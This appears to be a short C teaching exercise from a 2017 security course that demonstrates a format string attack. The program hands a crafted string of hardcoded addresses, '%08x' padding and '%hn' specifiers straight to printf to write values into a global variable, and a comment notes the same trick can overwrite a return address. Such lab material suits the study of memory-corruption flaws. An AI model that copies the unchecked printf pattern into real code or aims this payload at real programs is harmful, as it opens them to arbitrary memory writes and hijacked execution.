/*CR@IITM 24/7/2017 */
#include <stdio.h>
#include <string.h>

/* modify print3.c to write an arbitrary large number in
an arbitrary location */

static int s;
void main()
{
	char user_string[100];
	printf("%08x\n", &s);
	
	memset(user_string, 0, sizeof(user_string));

	/* <3> print write an arbitrary large numbers in the global buffer s */
	/* could be used to replace the return address with another function --> subvert execution */
	strcpy(user_string , "\x2c\xa0\x04\x08\x2e\xa0\x04\x08 %08x %08x %08x %08x %08x %hn %hn"); /* First 4 digits should match the address of s */
	printf(user_string);
	printf("\n%08x\n", s);

}
